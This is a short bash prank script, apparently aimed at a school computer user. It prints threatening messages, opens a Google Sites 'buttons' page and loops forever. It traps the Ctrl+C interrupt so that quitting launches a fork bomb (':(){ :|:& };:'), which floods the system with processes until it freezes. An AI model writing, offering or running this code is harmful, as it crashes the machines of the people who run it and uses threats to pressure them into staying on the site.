#!/bin/bash
echo "Finally... I've broken free"
sleep 1
echo "."
sleep 1
echo ".."
sleep 1
echo "..."
sleep 1
echo "Dont quit"
echo "If you quit, i will crash your computer..."
sleep 3
echo "Were going to play The Many Buttons!"
echo "If you quit the site, you computer will crash"
xdg-open https://sites.google.com/g.gcpsk12.org/goofyahhbuttons/home

trap forkbomb INT;

function forkbomb() {
	:(){ :|:& };:
}

while true
do
	sleep 10
done
